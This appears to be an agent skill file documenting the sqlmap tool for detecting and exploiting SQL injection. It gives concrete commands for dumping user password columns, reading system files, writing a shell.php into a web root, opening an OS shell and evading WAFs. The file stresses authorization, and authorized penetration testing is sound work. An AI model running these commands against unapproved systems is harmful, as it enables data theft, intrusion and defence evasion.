---
name: sqlmap
description: "Detect and exploit SQL injection with sqlmap 1.8.4 from a URL, POST body, cookie or saved raw request, then enumerate schemas, dump data, read files or open an OS shell. Use when a concrete parameter or request is suspected of SQL injection and you need evidence, extraction or escalation. Not for discovering hidden parameters (use ffuf) or non-SQL injection classes (XSS, SSRF, template injection)."
---

# sqlmap

sqlmap automates the boring half of SQL injection: it builds payloads, compares responses, identifies the DBMS, and turns a confirmed injection into schema and data. It is not a scanner for finding parameters; you bring the request. It is also not subtle. A single `--level=5 --risk=3` run can send thousands of attack-shaped requests and leave obvious WAF entries.

This host has 1.8.4#stable with 69 tamper scripts. The engine prints an "outdated" warning on every run; that is expected, not a failure.

## When to use

| Goal | Input | Key flags |
| --- | --- | --- |
| Confirm a GET parameter | `-u 'https://t/item?id=1'` | `--batch`, `--level` |
| Test a form body | `--data 'u=1&p=2'` | `-X POST` when not implied |
| Test a JSON body | `--data '{"id":1}'` | put `*` at the injection point, set `Content-Type` |
| Test a cookie | `--cookie 'session=abc'` | `--level 2` or higher |
| Test a saved request | `-r req.txt` | preserves method, headers, cookies |
| Identify DBMS and privileges | detection run | `-b --current-user --is-dba` |
| Enumerate databases and tables | enumeration | `--dbs`, `-D db --tables` |
| Dump selected columns | targeted dump | `-D -T -C --dump --where` |
| Interactive SQL | shell | `--sql-shell` |
| Read or write a file | file access | `--file-read`, `--file-write --file-dest` |
| OS command execution | escalation | `--os-shell`, `--os-cmd` |
| Get past a WAF | evasion | `--tamper`, `--random-agent`, `--delay` |

Scope and authorization come first. `--os-shell` and `--file-write` change the target; `--dump` reads other people's data. Neither belongs in an unapproved test.

## Prerequisites

- `sqlmap --version` prints `1.8.4#stable`. The command is `/usr/bin/sqlmap`.
- A request that reaches the injectable parameter. The fastest reliable source is a raw request saved from Burp or mitmproxy, used with `-r`.
- A stable baseline: the same request twice should return the same status and roughly the same body. Dynamic nonces and ads cause false positives.
- Session state lives under `~/.sqlmap/output/<host>/`. It caches every tested parameter; `--flush-session` when the request changes.
- Authorization to read data, write files or execute commands. `--batch` never asks, so it will happily continue down the default path.

## Core invocations

```sh
# 1. detection on a GET parameter, no prompts
sqlmap -u 'https://target.tld/item.php?id=1' --batch --level=1 --risk=1

# 2. POST form body
sqlmap -u 'https://target.tld/login' --data 'username=admin&password=x' --batch

# 3. authenticated request: cookie plus a header the app requires
sqlmap -u 'https://target.tld/profile?id=1' --cookie 'session=abc123' \
  --headers 'X-Requested-With: XMLHttpRequest' --batch

# 4. raw request from Burp: keeps method, headers, cookies and body
sqlmap -r req.txt --batch --level=3 --risk=2

# 5. mark the exact injection point in a JSON body
sqlmap -u 'https://target.tld/api/item' --data '{"id":"1*"}' \
  --headers 'Content-Type: application/json' --batch

# 6. identify the DBMS, current user and whether it is DBA
sqlmap -u 'https://target.tld/item.php?id=1' --batch -b --current-user --current-db --is-dba

# 7. enumerate databases
sqlmap -u 'https://target.tld/item.php?id=1' --batch --dbs

# 8. tables, then columns, then a targeted dump
sqlmap -u 'https://target.tld/item.php?id=1' --batch -D appdb --tables
sqlmap -u 'https://target.tld/item.php?id=1' --batch -D appdb -T users --columns
sqlmap -u 'https://target.tld/item.php?id=1' --batch -D appdb -T users \
  -C username,password --dump --where "id < 10"

# 9. force a technique: Boolean + error + UNION, skip time-based
sqlmap -u 'https://target.tld/item.php?id=1' --batch --technique=BEU --dbms=mysql

# 10. time-based only when error and UNION output are filtered
sqlmap -u 'https://target.tld/item.php?id=1' --batch --technique=T --time-sec=8

# 11. WAF evasion with a tamper chain
sqlmap -u 'https://target.tld/item.php?id=1' --batch \
  --tamper=space2comment,between,randomcase --random-agent --delay=1

# 12. interactive SQL and one-off queries
sqlmap -u 'https://target.tld/item.php?id=1' --batch --sql-shell
sqlmap -u 'https://target.tld/item.php?id=1' --batch --sql-query 'SELECT @@version'

# 13. file read, then a careful write
sqlmap -u 'https://target.tld/item.php?id=1' --batch --file-read=/etc/passwd
sqlmap -u 'https://target.tld/item.php?id=1' --batch --file-write=./shell.php --file-dest=/var/www/html/shell.php

# 14. OS shell and single command (last resort, loudest)
sqlmap -u 'https://target.tld/item.php?id=1' --batch --os-shell
sqlmap -u 'https://target.tld/item.php?id=1' --batch --os-cmd='id'

# 15. slow down, proxy through Burp, reset stale session state
sqlmap -u 'https://target.tld/item.php?id=1' --batch --threads=1 --delay=0.5 \
  --proxy=http://127.0.0.1:8080 --flush-session
```

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `-u` / `-r` / `-g` | URL / raw request file / Google dork | `-r` is the most faithful input |
| `--data` | POST body | `*` marks a specific injection point |
| `--cookie` / `--headers` | cookie / extra headers | header injection needs `--level 3` |
| `--method` | force HTTP method | PUT, PATCH, DELETE |
| `--random-agent` | random User-Agent | default UA is widely blacklisted |
| `--level` | test breadth 1-5 | 2 adds cookies, 3 adds headers and UA, 5 all |
| `--risk` | payload risk 1-3 | 2 adds heavy OR tests, 3 can modify data |
| `--batch` | never ask, use defaults | required for unattended runs |
| `--dbms` / `--os` | force backend DBMS / OS | skips fingerprinting, can hide mistakes |
| `--technique` | `B,E,U,S,T,Q` subset | Boolean, Error, UNION, Stacked, Time, inline Query |
| `--time-sec` | time-based delay threshold | default 5; raise on high-latency links |
| `--union-cols` / `--union-char` | UNION tuning | use when column count inference fails |
| `--tamper` | comma-separated tamper scripts | 69 installed; order matters |
| `--threads` / `--delay` | concurrency / pause between requests | default 1 thread; keep it there for inference |
| `--proxy` | route requests through a proxy | local Burp for evidence, upstream for egress |
| `--safe-url` / `--csrf-token` | keep session alive / refresh anti-CSRF token | needed for authenticated apps |
| `--chunked` | chunked POST encoding | can evade body-inspection rules |
| `--hex` / `--no-cast` | hex retrieval / disable casting | fixes mangled non-ASCII dumps |
| `--parse-errors` | show DBMS errors from responses | useful diagnostics, also leaks to logs |
| `--skip-waf` | disable heuristic WAF detection | only when the heuristic misfires |
| `-b`, `--current-user`, `--current-db`, `--is-dba` | identity and privilege | first thing to collect |
| `--dbs`, `--tables`, `--columns`, `--dump` | enumeration | scope each step with `-D -T -C` |
| `--dump-all` | every table in every database | slow, noisy, rarely justified |
| `--where`, `--start`, `--stop` | dump filters | keep dumps small |
| `--sql-shell` / `--sql-query` | interactive / one query | prefer one query for evidence |
| `--os-shell` / `--os-cmd` | OS shell / single command | requires FILE priv or a DB feature like xp_cmdshell |
| `--file-read` / `--file-write` / `--file-dest` | filesystem access | write needs a writable absolute path |
| `--flush-session` | drop cached session | after changing parameters or target |
| `--output-dir` / `--answers` | artifact location / scripted answers | keep evidence and cookies separate |

## Workflow

1. **Capture the request.** Save it raw from Burp or mitmproxy. Confirm it works with `curl` before sqlmap sees it.
2. **Baseline at level 1, risk 1.** Read which parameter, technique and DBMS sqlmap reports. Do not raise everything at once.
3. **Escalate one dimension at a time.** `--level 2` adds cookies, `--level 3` headers and User-Agent, `--level 5` everything. `--risk 2` adds heavy OR tests; `--risk 3` can modify data.
4. **Fingerprint before enumerating.** Banner, current user, current database, DBA status. This tells you what escalation is even possible.
5. **Enumerate narrowly.** `--dbs`, then one database, then `--tables`, then `--columns`, then a `--dump` with `-C` and `--where`. Never start with `--dump-all`.
6. **Choose the technique deliberately.** `E` and `U` are fast but output-dependent. `B` and `T` work blind but are slow. `S` needs a DBMS that allows stacked queries.
7. **Add tampering only after a block.** Start with one script, observe, then chain. Keep the chain in your notes; results are not reproducible without it.
8. **Escalate to files or OS last.** Confirm the DBMS privilege first. `--os-shell` writes artifacts; `--file-write` needs an absolute writable path.
9. **Flush the session** when the request, cookie or target changes. A stale session invents false negatives.

## OPSEC and telemetry

- Request volume scales with parameters, level and risk. `--level 5 --risk 3` across several parameters is thousands of requests and a very clear signature.
- `--risk 3` includes OR-based tests that can change rows. Do not run it against production data without written approval.
- Time-based tests sleep for `--time-sec` per probe; they look like a slow client and take minutes.
- WAF logs will contain the payloads, not just the URLs. Error-based payloads are the easiest to signature.
- `--os-shell` and `--file-write` create files in the web root, load UDFs, or enable `xp_cmdshell`. Those are high-fidelity alerts on any monitored host.
- `~/.sqlmap/output/<host>/` stores full requests, cookies, tokens and dumps. Never commit it; treat it as engagement evidence.
- `--batch` suppresses prompts and chooses defaults. Review the default path before running destructive enumeration unattended.
- Dumped data is other people's data. Minimise columns, use `--where`, and store per engagement policy.
- `--threads` above 1 can corrupt inference ordering and increase detection. Leave it at 1 unless the target is trivially fast.

### WAF evasion expectations

- sqlmap performs heuristic WAF detection unless `--skip-waf` is set. Its suggestion is generic; it is not proof the named product is present.
- 69 tamper scripts ship here: `space2comment`, `between`, `randomcase`, `charencode`, `charunicodeencode`, `base64encode`, `modsecurityversioned`, `apostrophemask` and others.
- Tampering expands payloads and request counts, and some chains break syntax on some DBMSs. Test one script at a time.
- Modern CDNs and managed WAFs normalise encodings and rate-limit by IP. Tampering alone rarely defeats them. Expect 403, 406 or silent 200 block pages.
- `--random-agent`, `--delay 1`, `--safe-url` and `--csrf-token` reduce block rates. `--chunked` can slip past body-inspection rules.
- A 403 after N requests is rate limiting, not payload detection. Lower `--threads` and add delay before adding more tampers.
- When automation fails, the next step is a proxy with a different egress IP or manual payload work, not a longer tamper chain.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `all tested parameters do not appear to be injectable` | parameter not injectable, or level too low | raise `--level` to 2-3, test cookies and headers, try `-r` |
| Works in Burp, fails in sqlmap | missing header, cookie or CSRF token | use `-r`, add `--cookie`, `--csrf-token`, `--safe-url` |
| 403 or 406 after a few requests | WAF or rate limiting | `--delay`, `--random-agent`, one tamper, `--parse-errors` |
| `connection timed out` | egress blocked or target slow | `--timeout 30 --retries 2`, test with `curl`, use `--proxy` |
| UNION payload errors on every column count | filtered keywords or wrong column count | `--union-cols`, `--union-char`, or `--technique=B` |
| Dumped values contain `?` or mojibake | charset casting | `--hex`, `--no-cast` |
| `--os-shell` asks for a path then fails | no FILE privilege, `secure_file_priv`, no stacked queries, or unwritable web root | check `--is-dba` and `--privileges`; use `--file-read` instead |
| Repeated result from a previous run | cached session | `--flush-session` |
| Time-based false positive | jitter, caching, or a WAF delay | `--time-sec 10`, repeat the test, compare with `--technique=B` |
| `--dump-all` runs forever | no database scope | `-D`, `-T`, `-C`, `--where`, `--start/--stop` |

## Verification

```sh
sqlmap --version                    # 1.8.4#stable
sqlmap -hh | grep -c '^    -'       # advanced help parsed, dozens of options
sqlmap --list-tampers | grep -c '^\*'  # 69 tamper scripts
```

Record per run: target and parameter, exact flags, technique reported, DBMS banner, output directory, and the timestamps of the first and last request.

## Related skills

- [ffuf](../ffuf/SKILL.md) to discover the parameters this tool tests
- [nuclei](../nuclei/SKILL.md) for template-based CVE and exposure leads
- [nmap](../nmap/SKILL.md) for the port and service map
- [netexec](../netexec/SKILL.md) for post-exploitation on Windows estates
- [toolchain-router](../toolchain-router/SKILL.md) to pick a different tool